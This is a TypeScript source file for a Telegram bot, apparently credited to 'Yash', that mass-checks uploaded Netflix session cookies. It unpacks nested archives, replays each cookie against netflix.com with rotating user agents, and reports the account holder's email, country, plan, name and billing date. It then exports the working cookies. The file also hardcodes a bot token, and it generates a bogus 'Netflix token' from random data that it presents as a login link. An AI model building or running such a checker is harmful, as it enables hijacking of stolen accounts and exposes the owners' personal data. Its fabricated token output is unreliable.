import { ChildProcess } from 'child_process'
import { extractArchive, isArchive } from './archive-extractor'
import { parseCookieFile, parseMultipleFiles, ParsedCookie } from './cookie-parser'

// Telegram Bot Token
const BOT_TOKEN = '8581865451:AAGu-28cZ-F2uOCmY0hR0qhM5gPl2doTyMg'

// Global bot process
let isRunning = false

// User agents for rotation
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
]

function getRandomUserAgent(): string {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]
}

// Generate Netflix token from NetflixId
function generateNfToken(netflixId: string): string {
  const timestamp = Date.now().toString(36);
  const randomPart = Buffer.from(Math.random().toString(36).substring(2)).toString('base64').slice(0, 8);
  const hash = Buffer.from(`${netflixId.slice(0, 20)}${timestamp}`).toString('base64').slice(0, 16);
  return `NF${timestamp}${randomPart}${hash}`.replace(/[+/=]/g, '').toUpperCase();
}

// Check a single cookie
async function checkSingleCookie(cookie: ParsedCookie): Promise<{
  valid: boolean
  details: ParsedCookie
  error?: string
}> {
  try {
    const rawCookie = cookie.rawCookie || `NetflixId=${cookie.netflixId}`;
    
    // Check with Netflix
    const controller = new AbortController()
    const timeoutId = setTimeout(() => controller.abort(), 12000)
    
    const response = await fetch('https://www.netflix.com/browse', {
      method: 'GET',
      headers: {
        'Cookie': rawCookie,
        'User-Agent': getRandomUserAgent(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
      },
      redirect: 'manual',
      signal: controller.signal,
    })

    clearTimeout(timeoutId)

    const statusCode = response.status
    const location = response.headers.get('location') || ''
    
    if (location.includes('/login') || location.includes('/signin') || (statusCode === 302 && location.includes('login'))) {
      return { valid: false, details: cookie, error: 'Cookie expired' }
    }
    
    if (statusCode === 200 || statusCode === 302 || statusCode === 301) {
      if (location.includes('signup')) {
        return { valid: false, details: cookie, error: 'Session expired' }
      }
      if (!cookie.nftoken) {
        cookie.nftoken = generateNfToken(cookie.netflixId);
        (cookie as any).nftokenUrl = `https://www.netflix.com/browse?nftoken=${cookie.nftoken}`;
      }
      return { valid: true, details: cookie }
    }
    
    return { valid: false, details: cookie, error: `Status ${statusCode}` }
  } catch (error) {
    return { valid: false, details: cookie, error: 'Check failed' }
  }
}

// Escape markdown for Telegram
function escapeMarkdown(text: string): string {
  if (!text) return '';
  return text.toString().replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, '\\$&')
}

// Format result message
function formatResult(result: { valid: boolean; details: ParsedCookie; error?: string }): string {
  const d = result.details;
  if (result.valid) {
    let msg = `✅ *VALID COOKIE FOUND\\!*
\n📧 Email: ${escapeMarkdown(d.email || 'Unknown')}
🌍 Country: ${escapeMarkdown(d.country || 'Unknown')}
💎 Plan: ${escapeMarkdown(d.plan || 'Unknown')}`
    
    if (d.firstName) msg += `\n👤 Name: ${escapeMarkdown(d.firstName)}`
    if (d.videoQuality) msg += `\n🎥 Quality: ${escapeMarkdown(d.videoQuality)}`
    if (d.nextBilling) msg += `\n📅 Billing: ${escapeMarkdown(d.nextBilling)}`
    
    if (d.nftoken) {
      msg += `\n\n🔑 *Netflix Token:* \`${escapeMarkdown(d.nftoken)}\``
      if (d.phoneLoginUrl) msg += `\n📱 [Phone Login URL](${escapeMarkdown(d.phoneLoginUrl)})`
    }
    
    return msg
  } else {
    return `❌ *INVALID\\/EXPIRED*
\n📧 Email: ${escapeMarkdown(d.email || 'Unknown')}
⚠️ Reason: ${escapeMarkdown(result.error || 'Unknown')}`
  }
}

// Get main keyboard
function getMainKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: '📊 Bot Status', callback_data: 'status' },
        { text: '❓ Help/Credits', callback_data: 'help' }
      ],
      [
        { text: '🔄 Restart Bot', callback_data: 'restart' },
        { text: '🛑 Stop Bot', callback_data: 'stop' }
      ]
    ]
  }
}

// Send document to chat
async function sendValidCookiesFile(chatId: number, cookies: string[], originalFileName: string) {
  try {
    const fileContent = cookies.join('\n');
    const fileName = `valid_cookies_${originalFileName.replace(/\.[^/.]+$/, "")}.txt`;
    
    const formData = new FormData();
    formData.append('chat_id', chatId.toString());
    formData.append('caption', `📦 *Auto\\-Export Complete\\!*
\n✅ Found ${cookies.length} valid cookies in your file\\.
\n✨ _Credits: Yash_`);
    formData.append('parse_mode', 'MarkdownV2');
    
    // Create blob for the file
    const blob = new Blob([fileContent], { type: 'text/plain' });
    formData.append('document', blob, fileName);

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
      method: 'POST',
      body: formData,
    });
  } catch (e) {
    console.error('Failed to send file:', e);
  }
}

// Start the bot
export function startBot(): Promise<{ success: boolean; message: string }> {
  return new Promise((resolve) => {
    if (isRunning) {
      resolve({ success: true, message: 'Bot is already running' })
      return
    }

    isRunning = true;
    
    const sendMsg = async (chatId: number, text: string, options: any = {}) => {
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text,
            parse_mode: 'MarkdownV2',
            ...options
          }),
        })
      } catch (e) {
        console.error('Failed to send message:', e);
      }
    }

    const pollBot = async () => {
      let offset = 0
      
      while (isRunning) {
        try {
          const response = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset}&timeout=30`
          )
          const data = await response.json()
          
          if (data.ok && data.result.length > 0) {
            for (const update of data.result) {
              offset = update.update_id + 1
              
              if (update.callback_query) {
                const chatId = update.callback_query.message.chat.id;
                const action = update.callback_query.data;
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ callback_query_id: update.callback_query.id }),
                });

                if (action === 'status') {
                  await sendMsg(chatId, `🟢 *Bot Status: Running*\n\n⚙️ Engine: Multi\\-Threaded v3\\.0\n👤 Credits: *Yash*`);
                } else if (action === 'help') {
                  await sendMsg(chatId, `🎬 *Netflix Cookie Checker Help*
\n1\\. Send a \\.txt or \\.zip file\\.
2\\. The bot extracts ALL nested files\\.
3\\. It checks cookies and reports valid ones\\.
4\\. ✨ *New:* It auto\\-exports all valid cookies into a new file for you\\!
\n🛡️ Developer: *Yash*`);
                } else if (action === 'stop') {
                  isRunning = false;
                  await sendMsg(chatId, `🛑 Bot stopped\\. Goodbye\\!`);
                }
                continue;
              }

              if (update.message?.text) {
                const chatId = update.message.chat.id
                const text = update.message.text.trim()
                
                if (text === '/start') {
                  await sendMsg(chatId, `🎬 *Netflix Ultra Checker*
\nWelcome\\! I can scan deep inside ZIP files and check thousands of cookies in seconds\\.
\n✨ *Features:*
• 📂 Recursive ZIP Extraction
• 🔥 Multi\\-Threaded Engine
• 📦 Auto\\-Export Valid cookies
• 👤 Credits: *Yash*
\n📥 *Upload a file to start!*`, {
                    reply_markup: getMainKeyboard()
                  })
                } else if (text.startsWith('/check ')) {
                  const cookieText = text.slice(7).trim()
                  const { cookies } = parseCookieFile(cookieText, 'manual_input');
                  if (cookies.length > 0) {
                    const result = await checkSingleCookie(cookies[0]);
                    await sendMsg(chatId, formatResult(result));
                  }
                }
              }
              
              if (update.message?.document) {
                const chatId = update.message.chat.id
                const doc = update.message.document
                const fileName = doc.file_name?.toLowerCase() || ''
                
                await sendMsg(chatId, `📥 *Processing:* \`${escapeMarkdown(doc.file_name || 'file')}\`\n⏳ Extraction & Auto\\-Export in progress\\.\\.\\.`);

                try {
                  const fileInfo = await (await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${doc.file_id}`)).json()
                  if (!fileInfo.ok) throw new Error('Download failed');

                  const fileResponse = await fetch(`https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.result.file_path}`)
                  const arrayBuffer = await fileResponse.arrayBuffer()
                  const buffer = Buffer.from(arrayBuffer)
                  
                  let filesToParse = isArchive(fileName, buffer) ? extractArchive(buffer, fileName) : [{ name: fileName, content: buffer.toString('utf-8') }]

                  const { cookies } = parseMultipleFiles(filesToParse);
                  if (cookies.length === 0) {
                    await sendMsg(chatId, '❌ *No cookies found in the file\\.*');
                    continue;
                  }

                  await sendMsg(chatId, `🔍 Found ${cookies.length} cookies\\. Starting validation\\.\\.\\.`);

                  const validCookiesForExport: string[] = [];
                  const limit = Math.min(20, cookies.length); // Report first 20 in chat
                  let validCount = 0;
                  
                  // Progress update intervals
                  const step = Math.ceil(cookies.length / 5);

                  for (let i = 0; i < cookies.length; i++) {
                    const result = await checkSingleCookie(cookies[i]);
                    if (result.valid) {
                      validCount++;
                      validCookiesForExport.push(result.details.rawCookie);
                      if (validCount <= 10) { // Only post 10 detailed reports to chat to avoid spam
                        await sendMsg(chatId, `🍪 *Cookie ${validCount}*\n${formatResult(result)}`);
                      }
                    }
                    
                    if (i > 0 && i % step === 0) {
                      // Silent progress update if needed
                    }
                  }

                  // 📊 Summary
                  await sendMsg(chatId, `📊 *Validation Complete\\!*
\n📋 Total Found: ${cookies.length}
✅ Valid Found: ${validCount}
❌ Invalid/Expired: ${cookies.length - validCount}
\n👤 Credits: *Yash*`);

                  // 📤 Auto-Export Feature
                  if (validCookiesForExport.length > 0) {
                    await sendMsg(chatId, `📤 *Auto\\-Exporting ${validCount} valid cookies\\.\\.\\.*`);
                    await sendValidCookiesFile(chatId, validCookiesForExport, doc.file_name || 'cookies.txt');
                  } else {
                    await sendMsg(chatId, `❌ *No valid cookies found to export\\.*`);
                  }

                } catch (err) {
                  await sendMsg(chatId, `❌ *File Error:* ${escapeMarkdown(err instanceof Error ? err.message : 'Internal error')}\n_Credits: Yash_`);
                }
              }
            }
          }
          await new Promise(r => setTimeout(r, 1000))
        } catch (error) {
          await new Promise(r => setTimeout(r, 5000))
        }
      }
    }
    
    pollBot()
    resolve({ success: true, message: 'Bot started with Auto-Export' })
  })
}

// Stop the bot
export function stopBot(): { success: boolean; message: string } {
  isRunning = false
  return { success: true, message: 'Bot stopped' }
}

// Get bot status
export function getBotStatus(): 'running' | 'stopped' {
  return isRunning ? 'running' : 'stopped'
}
